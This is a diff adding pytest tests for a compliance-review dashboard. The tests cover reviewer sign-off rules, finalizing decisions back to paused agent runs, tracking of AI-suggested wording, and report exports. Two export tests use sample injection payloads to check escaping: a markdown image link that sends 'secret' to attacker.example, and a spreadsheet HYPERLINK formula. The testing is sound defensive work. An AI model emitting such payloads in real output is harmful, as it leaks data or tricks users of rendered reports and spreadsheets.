@@ -1,0 +1,251 @@
+"""Human-in-the-loop rules, finalizing, and the exported report."""
+
+import csv
+import io
+import json
+import re
+
+import pytest
+
+from phase3_dashboard.core import analysis, review
+from phase3_dashboard.core.report import build_report, to_csv, to_json, to_markdown
+
+REVIEWER = "Mahsa Sheikhi"
+
+
+def first(session, coverage):
+    return next(f for f in session.findings if f.coverage == coverage)
+
+
+def decide_all(session, reviewer=REVIEWER):
+    for finding in session.findings:
+        if finding.status == "pending":
+            review.approve(session, finding.finding_id, reviewer)
+
+
+def test_every_decision_needs_a_named_reviewer(sample_session):
+    finding = sample_session.findings[0]
+    for name in ("", "   ", None, "x" * 81):
+        with pytest.raises(review.ReviewError):
+            review.approve(sample_session, finding.finding_id, name)
+    assert finding.status == "pending"
+
+
+def test_reject_needs_a_reason(sample_session):
+    finding = sample_session.findings[0]
+    with pytest.raises(review.ReviewError):
+        review.reject(sample_session, finding.finding_id, REVIEWER, "no")
+    review.reject(sample_session, finding.finding_id, REVIEWER, "Outside this policy's scope")
+    assert finding.status == "rejected" and finding.reviewer_note == "Outside this policy's scope"
+
+
+def test_invalid_findings_can_be_rejected_but_not_approved(sample_session):
+    finding = sample_session.findings[0]
+    finding.problems.append("Coverage 'Mostly' isn't allowed.")
+    with pytest.raises(review.ReviewError):
+        review.approve(sample_session, finding.finding_id, REVIEWER)
+    review.reject(sample_session, finding.finding_id, REVIEWER, "Malformed agent output")
+
+
+def test_editing_a_recommendation_is_recorded(sample_session):
+    finding = first(sample_session, "Partial")
+    with pytest.raises(review.ReviewError):  # a gap can't lose its recommendation
+        review.approve(sample_session, finding.finding_id, REVIEWER, edited_recommendation="   ")
+    review.approve(sample_session, finding.finding_id, REVIEWER, edited_recommendation="Review accounts every 90 days.")
+    assert finding.final_recommendation == "Review accounts every 90 days."
+    event = sample_session.audit_log[-1]
+    assert event.action == "approved_with_edits"
+    assert event.detail["recommendation_before"] == finding.recommendation
+
+
+def test_unchanged_text_is_not_an_edit(sample_session):
+    finding = first(sample_session, "Partial")
+    review.approve(sample_session, finding.finding_id, REVIEWER, edited_recommendation=finding.recommendation + "  ")
+    assert finding.recommendation_edited is None
+    assert sample_session.audit_log[-1].action == "approved"
+
+
+def test_decisions_can_be_undone_until_finalized(sample_session):
+    finding = sample_session.findings[0]
+    review.approve(sample_session, finding.finding_id, REVIEWER)
+    with pytest.raises(review.ReviewError):
+        review.approve(sample_session, finding.finding_id, REVIEWER)  # already decided
+    review.reopen(sample_session, finding.finding_id, "Second Reviewer")
+    assert finding.status == "pending" and finding.reviewer is None
+    assert [e.action for e in sample_session.audit_log] == ["approved", "reopened"]
+
+
+def test_finalize_waits_for_every_decision(sim_backend, sample_session):
+    ok, reason = review.can_finalize(sample_session, REVIEWER)
+    assert not ok and "still need a decision" in reason
+    with pytest.raises(review.ReviewError):
+        analysis.finalize_review(sim_backend, sample_session, REVIEWER)
+
+
+def test_finalize_sends_every_decision_back_to_its_paused_run(sim_backend, sample_session):
+    rejected = first(sample_session, "Missing")
+    review.reject(sample_session, rejected.finding_id, REVIEWER, "Not applicable here")
+    edited = first(sample_session, "Partial")
+    review.approve(sample_session, edited.finding_id, REVIEWER, edited_recommendation="Edited text.")
+    decide_all(sample_session)
+
+    sent, results = {}, {}
+    original_submit = sim_backend.submit_review
+
+    def spy(thread_id, decisions):
+        sent[thread_id] = decisions
+        results[thread_id] = original_submit(thread_id, decisions)
+        return results[thread_id]
+
+    sim_backend.submit_review = spy
+    assert analysis.finalize_review(sim_backend, sample_session, REVIEWER) == []
+    assert sample_session.finalized and sample_session.finalized_by == REVIEWER
+    assert set(sent) == set(sample_session.run.ok_threads)  # runs with zero findings are closed too
+
+    assert sent[rejected.thread_id][rejected.source_finding_id] == {"decision": "rejected"}
+    assert sent[edited.thread_id][edited.source_finding_id] == {"decision": "approved", "recommendation": "Edited text."}
+    total = sum(len(d) for d in sent.values())
+    assert total == len(sample_session.findings)
+
+    # The pipeline's own final record now matches the review.
+    final = [f for r in results.values() for f in r["findings"]]
+    assert sum(f["status"] == "rejected" for f in final) == 1
+    assert not any(f["status"] == "pending" for f in final)
+    assert next(f for f in final if f["requirement"] == edited.requirement)["recommendation"] == "Edited text."
+
+    with pytest.raises(review.ReviewError):  # locked after finalizing
+        review.reopen(sample_session, edited.finding_id, REVIEWER)
+
+
+def test_finalize_fails_if_the_pipeline_records_a_different_decision(sim_backend, sample_session):
+    decide_all(sample_session)
+    sim_backend.submit_review = lambda thread_id, decisions: {
+        "findings": [{"finding_id": fid, "status": "pending"} for fid in decisions]}
+    errors = analysis.finalize_review(sim_backend, sample_session, REVIEWER)
+    assert errors and "recorded" in errors[0] and not sample_session.finalized
+
+
+def test_a_failed_resume_is_retried_without_repeating_successful_threads(sim_backend, sample_session):
+    decide_all(sample_session)
+    calls = []
+    original_submit = sim_backend.submit_review
+
+    def flaky(thread_id, decisions):
+        calls.append(thread_id)
+        if len(calls) == 2:
+            raise ConnectionError("checkpoint store unavailable")
+        return original_submit(thread_id, decisions)
+
+    sim_backend.submit_review = flaky
+    errors = analysis.finalize_review(sim_backend, sample_session, REVIEWER)
+    assert len(errors) == 1 and not sample_session.finalized
+    first_pass = len(calls)
+    assert analysis.finalize_review(sim_backend, sample_session, REVIEWER) == []
+    assert sample_session.finalized
+    assert len(calls) == first_pass + 1  # only the failed thread ran again
+
+
+def finalized(sim_backend, session):
+    review.reject(session, session.findings[0].finding_id, REVIEWER, "Duplicate of another finding")
+    decide_all(session)
+    assert analysis.finalize_review(sim_backend, session, REVIEWER) == []
+    return build_report(session)
+
+
+def test_report_requires_a_finalized_review(sample_session):
+    with pytest.raises(ValueError):
+        build_report(sample_session)
+
+
+def test_report_contains_only_approved_findings(sim_backend, sample_session):
+    report = finalized(sim_backend, sample_session)
+    ids = {f["id"] for f in report["approved_findings"]}
+    assert sample_session.findings[0].finding_id not in ids
+    assert len(ids) == len(sample_session.findings) - 1
+    assert report["simulated"] is True and report["framework"]["version"] == "5.2.0"
+    assert [e["action"] for e in report["audit_log"]][-1] == "finalized"
+    json.loads(to_json(report))
+
+
+def test_markdown_export_neutralizes_model_text(sim_backend, sample_session):
+    target = sample_session.findings[1]
+    target.finding = "![leak](https://attacker.example/x.png?d=secret) <img src=x> | broken | table"
+    markdown = to_markdown(finalized(sim_backend, sample_session))
+    assert "![leak](" not in markdown
+    assert not re.search(r"(?<!\\)<img", markdown)
+    assert r"!\[leak\](https://attacker.example" in markdown
+    assert "SIMULATED DATA" in markdown
+
+
+def test_csv_export_blocks_spreadsheet_formulas(sim_backend, sample_session):
+    sample_session.findings[1].finding = '=HYPERLINK("https://attacker.example","click")'
+    rows = list(csv.DictReader(io.StringIO(to_csv(finalized(sim_backend, sample_session)))))
+    assert rows[0]["finding"].startswith("'=")
+    assert {"id", "coverage", "framework_control", "source", "reviewer"} <= set(rows[0])
+
+
+# ---------------------------------------------------------------- assistant suggestions and bulk approval
+
+def test_a_suggestion_changes_nothing_until_the_reviewer_approves_it(sample_session):
+    finding = first(sample_session, "Partial")
+    before = (finding.status, finding.recommendation, finding.final_recommendation)
+    review.record_suggestion(sample_session, finding.finding_id, "Review accounts every 90 days.", REVIEWER,
+                             "Suggest better wording")
+    assert (finding.status, finding.recommendation, finding.final_recommendation) == before
+    assert finding.assistant_suggestion == "Review accounts every 90 days."
+    event = sample_session.audit_log[-1]
+    assert event.action == "assistant_suggested" and event.detail["question"] == "Suggest better wording"
+
+    review.approve(sample_session, finding.finding_id, REVIEWER,
+                   edited_recommendation="Review accounts every 90 days.")
+    assert finding.recommendation_origin == "assistant"
+    assert sample_session.audit_log[-1].action == "approved_with_ai_suggestion"
+
+
+def test_editing_the_assistants_wording_counts_as_the_reviewers_edit(sample_session):
+    finding = first(sample_session, "Partial")
+    review.record_suggestion(sample_session, finding.finding_id, "Review accounts quarterly.", REVIEWER)
+    review.approve(sample_session, finding.finding_id, REVIEWER,
+                   edited_recommendation="Review accounts quarterly and log each review.")
+    assert finding.recommendation_origin == "reviewer"
+    event = sample_session.audit_log[-1]
+    assert event.action == "approved_with_edits" and event.detail["assistant_suggestion"] == "Review accounts quarterly."
+
+
+def test_suggestions_are_ignored_after_sign_off(sim_backend, sample_session):
+    decide_all(sample_session)
+    analysis.finalize_review(sim_backend, sample_session, REVIEWER)
+    finding = sample_session.findings[0]
+    review.record_suggestion(sample_session, finding.finding_id, "Too late", REVIEWER)
+    assert finding.assistant_suggestion is None
+
+
+def test_bulk_approval_skips_flagged_and_gap_findings(sample_session):
+    flagged = first(sample_session, "Full")
+    flagged.flags.append("Coverage is Full but a recommendation was given.")
+    eligible = review.bulk_approvable(sample_session)
+    assert flagged not in eligible and all(f.coverage == "Full" and not f.flags for f in eligible)
+    assert review.approve_all_full(sample_session, REVIEWER) == len(eligible)
+    assert all(f.status == "approved" for f in eligible) and flagged.status == "pending"
+    assert all(e.detail["bulk"] for e in sample_session.audit_log)
+    with pytest.raises(review.ReviewError):
+        review.approve_all_full(sample_session, "  ")
+
+
+def test_report_marks_where_each_approved_recommendation_came_from(sim_backend, sample_session):
+    by_ai, by_person = [f for f in sample_session.findings if f.coverage == "Partial"][:2]
+    review.record_suggestion(sample_session, by_ai.finding_id, "Assistant wording.", REVIEWER)
+    review.approve(sample_session, by_ai.finding_id, REVIEWER, edited_recommendation="Assistant wording.")
+    review.approve(sample_session, by_person.finding_id, REVIEWER, edited_recommendation="My wording.")
+    decide_all(sample_session)
+    assert analysis.finalize_review(sim_backend, sample_session, REVIEWER) == []
+    report = build_report(sample_session)
+    records = {f["id"]: f for f in report["approved_findings"]}
+    assert records[by_ai.finding_id]["recommendation_origin"] == "assistant"
+    assert records[by_person.finding_id]["recommendation_origin"] == "reviewer"
+    markdown = to_markdown(report)
+    assert "_(AI assistant's wording, accepted by reviewer)_" in markdown
+    assert "_(edited by reviewer)_" in markdown
+    assert "Assistant suggested wording" in markdown and "Approved with the assistant's wording" in markdown
+    signed_line = markdown.split("Signed off by:** ")[1].split("\n")[0]
+    assert re.search(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2} UTC$", signed_line)  # readable time, not ISO
